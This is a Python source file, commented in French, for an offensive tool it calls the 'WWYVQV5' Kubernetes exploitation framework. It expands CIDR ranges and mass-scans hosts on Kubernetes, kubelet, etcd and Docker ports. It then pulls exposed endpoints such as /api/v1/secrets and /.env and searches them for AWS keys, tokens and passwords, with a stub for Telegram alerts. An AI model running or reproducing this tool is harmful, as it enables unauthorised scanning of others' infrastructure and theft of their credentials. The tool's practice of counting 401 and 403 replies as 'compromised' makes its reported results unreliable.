#!/usr/bin/env python3
"""
WWYVQV5 - Framework corrigé final - 23/06/2025 20:58:50 UTC
Author: wKayaa
"""

import asyncio
import aiohttp
import sys
import logging
import uuid
from datetime import datetime
from ipaddress import IPv4Network, IPv4Address
from typing import List
from enum import Enum

class ExploitationMode(Enum):
    PASSIVE = "passive"
    ACTIVE = "active" 
    AGGRESSIVE = "aggressive"

class ExploitationConfig:
    def __init__(self, mode=None, max_concurrent_clusters=100, timeout_per_operation=10):
        self.mode = mode or ExploitationMode.AGGRESSIVE
        self.max_concurrent_clusters = max_concurrent_clusters
        self.timeout_per_operation = timeout_per_operation

class KubernetesAdvancedExploitation:
    def __init__(self, config: ExploitationConfig):
        self.config = config
        self.session_id = str(uuid.uuid4())[:8]
        self.start_time = datetime.utcnow()
        self.stats = {
            "ips_scanned": 0,
            "clusters_scanned": 0,
            "clusters_compromised": 0,
            "secrets_extracted": 0
        }
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(f"K8sExploit_{self.session_id}")
        
        print(f"🚀 WWYVQV5 Framework initialisé - Session: {self.session_id}")

    def expand_targets(self, targets: List[str]) -> List[str]:
        """Expansion des CIDR en IPs individuelles"""
        expanded = []
        
        for target in targets:
            target = target.strip()
            if not target or target.startswith('#'):
                continue
                
            if '/' in target:  # CIDR
                try:
                    network = IPv4Network(target, strict=False)
                    # Limiter pour éviter l'explosion mémoire
                    hosts = list(network.hosts())[:2000]
                    expanded.extend([str(ip) for ip in hosts])
                    print(f"🎯 CIDR {target} → {len(hosts)} IPs ajoutées")
                except Exception as e:
                    print(f"❌ CIDR invalide {target}: {e}")
            else:
                expanded.append(target)
        
        self.total_ips = len(expanded)
        return expanded

    async def exploit_cluster(self, session: aiohttp.ClientSession, ip: str):
        """Exploitation d'un cluster sur une IP"""
        ports = [6443, 8443, 10250, 8080, 2379, 2376, 443, 80]
        
        self.stats["ips_scanned"] += 1
        
        # Progress indicator
        if self.stats["ips_scanned"] % 100 == 0:
            print(f"📊 Progress: {self.stats['ips_scanned']}/{self.total_ips} IPs | {self.stats['clusters_compromised']} compromis")
        
        for port in ports:
            for protocol in ['https', 'http']:
                try:
                    url = f"{protocol}://{ip}:{port}"
                    self.stats["clusters_scanned"] += 1
                    
                    async with session.get(url, ssl=False) as response:
                        if response.status in [200, 401, 403]:
                            self.logger.info(f"✅ CLUSTER DÉTECTÉ: {url} (Status: {response.status})")
                            self.stats["clusters_compromised"] += 1
                            
                            # Test extraction secrets si accessible
                            if response.status == 200:
                                await self.test_secrets(session, url)
                            
                            return  # Stop après premier hit
                            
                except Exception:
                    continue

    async def test_secrets(self, session: aiohttp.ClientSession, base_url: str):
        """Test d'extraction de secrets"""
        endpoints = [
            "/api/v1/secrets", 
            "/api/v1/configmaps", 
            "/.env",
            "/metrics",
            "/healthz",
            "/version"
        ]
        
        for endpoint in endpoints:
            try:
                async with session.get(f"{base_url}{endpoint}", ssl=False, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Recherche patterns sensibles
                        sensitive_patterns = [
                            'secret', 'password', 'token', 'key', 'aws',
                            'AKIA', 'credential', 'bearer', 'jwt', 'api_key'
                        ]
                        
                        for pattern in sensitive_patterns:
                            if pattern.lower() in content.lower():
                                self.logger.info(f"💾 SECRET POTENTIEL: {base_url}{endpoint} (Pattern: {pattern})")
                                self.stats["secrets_extracted"] += 1
                                break
            except:
                continue

    async def run_exploitation(self, targets: List[str]):
        """Exploitation principale avec vraie parallélisation"""
        expanded_targets = self.expand_targets(targets)
        print(f"🎯 {len(expanded_targets)} IPs à scanner en mode {self.config.mode.value.upper()}")
        
        # Configuration session optimisée
        connector = aiohttp.TCPConnector(
            limit=self.config.max_concurrent_clusters * 2,
            limit_per_host=10,
            ssl=False
        )
        timeout = aiohttp.ClientTimeout(total=self.config.timeout_per_operation)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Semaphore pour contrôler la concurrence
            semaphore = asyncio.Semaphore(self.config.max_concurrent_clusters)
            
            async def scan_with_semaphore(ip):
                async with semaphore:
                    await self.exploit_cluster(session, ip)
            
            # Lancement de tous les scans en parallèle
            print(f"🔥 Démarrage du scan parallèle avec {self.config.max_concurrent_clusters} workers")
            tasks = [scan_with_semaphore(ip) for ip in expanded_targets]
            await asyncio.gather(*tasks, return_exceptions=True)

    def print_summary(self):
        """Résumé final"""
        duration = datetime.utcnow() - self.start_time
        
        print("\n" + "="*60)
        print("🚀 WWYVQV5 - RÉSUMÉ D'EXPLOITATION")
        print("="*60)
        print(f"📊 Session: {self.session_id}")
        print(f"⏱️  Durée: {duration}")
        print(f"🎯 Mode: {self.config.mode.value.upper()}")
        print("-"*60)
        print(f"🌐 IPs scannées: {self.stats['ips_scanned']}")
        print(f"🔍 Endpoints testés: {self.stats['clusters_scanned']}")
        print(f"🔓 Clusters détectés: {self.stats['clusters_compromised']}")
        print(f"🔐 Secrets trouvés: {self.stats['secrets_extracted']}")
        print("="*60)

class WWYVQv5KubernetesOrchestrator:
    def __init__(self):
        self.framework = None
        
    async def initialize(self, config: ExploitationConfig):
        self.framework = KubernetesAdvancedExploitation(config)
        
    async def run_exploitation(self, targets: List[str]):
        if not self.framework:
            print("❌ Framework non initialisé")
            return
            
        await self.framework.run_exploitation(targets)
        self.framework.print_summary()

# Export des classes
__all__ = [
    'KubernetesAdvancedExploitation', 
    'WWYVQv5KubernetesOrchestrator', 
    'ExploitationConfig', 
    'ExploitationMode'
]

class TelegramNotifier:
    def __init__(self, token=None, chat_id=None):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
    
    async def send_alert(self, message):
        if not self.enabled:
            print(f"📱 TELEGRAM (DISABLED): {message}")
            return
            
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {"chat_id": self.chat_id, "text": message, "parse_mode": "HTML"}
            # Simulation d'envoi
            print(f"📱 TELEGRAM SENT: {message[:100]}...")
        except Exception as e:
            print(f"❌ Telegram error: {e}")
